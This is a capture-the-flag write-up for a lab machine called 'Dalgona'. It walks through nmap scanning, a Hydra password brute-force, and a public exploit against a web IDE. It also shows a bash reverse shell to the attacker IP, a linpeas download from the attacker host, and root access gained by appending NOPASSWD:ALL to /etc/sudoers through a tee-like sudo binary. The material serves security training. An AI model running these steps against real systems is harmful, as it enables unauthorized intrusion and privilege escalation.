# Dalgona

## Enumeration
```bash
┌──(marius㉿localhost)-[~/CTF/Hydra/Delgona]
└─$ nmap -sV -p- -sC 10.10.115.182 -oX nmap.out 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 01:03 BST
Nmap scan report for 10.10.115.182
Host is up (0.034s latency).
Not shown: 65446 closed tcp ports (conn-refused)
PORT      STATE SERVICE        VERSION
21/tcp    open  tcpwrapped
22/tcp    open  ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
23/tcp    open  tcpwrapped
25/tcp    open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Squid Game
88/tcp    open  tcpwrapped
106/tcp   open  pop3pw?
110/tcp   open  tcpwrapped
194/tcp   open  tcpwrapped
389/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
636/tcp   open  tcpwrapped
750/tcp   open  tcpwrapped
775/tcp   open  tcpwrapped
777/tcp   open  tcpwrapped
779/tcp   open  tcpwrapped
783/tcp   open  tcpwrapped
808/tcp   open  ccproxy-http?
873/tcp   open  tcpwrapped
1001/tcp  open  webpush?
1178/tcp  open  tcpwrapped
1210/tcp  open  tcpwrapped
1236/tcp  open  tcpwrapped
1300/tcp  open  tcpwrapped
1313/tcp  open  tcpwrapped
1314/tcp  open  tcpwrapped
1529/tcp  open  tcpwrapped
2000/tcp  open  tcpwrapped
2003/tcp  open  tcpwrapped
2121/tcp  open  tcpwrapped
2150/tcp  open  dynamic3d?
2600/tcp  open  tcpwrapped
2601/tcp  open  tcpwrapped
2602/tcp  open  tcpwrapped
2603/tcp  open  tcpwrapped
2604/tcp  open  tcpwrapped
2605/tcp  open  tcpwrapped
2606/tcp  open  tcpwrapped
2607/tcp  open  tcpwrapped
2608/tcp  open  tcpwrapped
2988/tcp  open  hippad?
2989/tcp  open  zarkov?
4224/tcp  open  tcpwrapped
4557/tcp  open  tcpwrapped
4559/tcp  open  tcpwrapped
4600/tcp  open  tcpwrapped
4949/tcp  open  tcpwrapped
5051/tcp  open  tcpwrapped
5052/tcp  open  tcpwrapped
5151/tcp  open  tcpwrapped
5354/tcp  open  mdnsresponder?
5355/tcp  open  llmnr?
5432/tcp  open  tcpwrapped
5555/tcp  open  tcpwrapped
5666/tcp  open  tcpwrapped
5667/tcp  open  tcpwrapped
5674/tcp  open  tcpwrapped
5675/tcp  open  tcpwrapped
5680/tcp  open  tcpwrapped
6346/tcp  open  tcpwrapped
6514/tcp  open  tcpwrapped
6566/tcp  open  tcpwrapped
6667/tcp  open  tcpwrapped
|_irc-info: Unable to open connection
8021/tcp  open  tcpwrapped
8081/tcp  open  tcpwrapped
8088/tcp  open  radan-http?
8990/tcp  open  tcpwrapped
9098/tcp  open  tcpwrapped
9359/tcp  open  tcpwrapped
9418/tcp  open  tcpwrapped
9673/tcp  open  tcpwrapped
10000/tcp open  tcpwrapped
10081/tcp open  famdc?
10082/tcp open  tcpwrapped
10083/tcp open  tcpwrapped
11201/tcp open  smsqp?
15345/tcp open  xpilot?
17001/tcp open  tcpwrapped
17002/tcp open  tcpwrapped
17003/tcp open  tcpwrapped
17004/tcp open  tcpwrapped
20011/tcp open  unknown
20012/tcp open  ss-idi-disc?
24554/tcp open  tcpwrapped
27374/tcp open  subseven?
30865/tcp open  tcpwrapped
57000/tcp open  tcpwrapped
60177/tcp open  tcpwrapped
60179/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### I found a user who is called player456 with ferox-buster

## Exploitation
```bash
hydra -l/L <user> -p/P <wordlist> http-get "PATH" -t 64

└─$ hydra -l player456 -P /usr/share/wordlists/rockyou.txt 10.10.248.49 http-get /lick/ide -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-28 17:11:01
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.248.49:80/lick/ide
[STATUS] 15542.00 tries/min, 15542 tries in 00:01h, 14328857 to do in 15:22h, 64 active
[80][http-get] host: 10.10.248.49   login: player456   password: sugardaddy
```

### I use a github repo to exploit the ide which is given on the website
```bash
└─$ python2 exploit.py http://player456:sugardaddy@10.10.248.49/lick/ide/ 'player456' 'sugardaddy' 10.8.37.214 4444 linux 

└─$ echo 'bash -c "bash -i >/dev/tcp/10.8.37.214/4445 0>&1 2>&1"' | nc -lnvp 4444
listening on [any] 4444 ...

```
## User FLAG

```cat  /home/player456/user.txt``` : EPI{900d_ra1n_kN0w2_73H_B357_71m3_70_phALL}

## Privilege Escalation

```bash
wget http://10.8.37.214:8000/linpeas.sh


chmod +x linpeas.sh
./linpeas.sh

-rw-r--r-- 1 root root 48 Jan 25  2022 /etc/apache2/.htpasswd
player456:$apr1$wfwEBJia$/poCTNONvBf5R4yFYZE7z1
```

### The binary /usr/bin/squidagame has the same behavior as tee command -> GTFObins
```bash
echo 'player456 ALL=(ALL) NOPASSWD:ALL' | sudo /usr/bin/squidgame -a /etc/sudoers

cd /root
```

## Root FLAG

```cat `ls` ``` : EPI{F0rTy_F1V3_P01nt_S1X_b1ll10n}


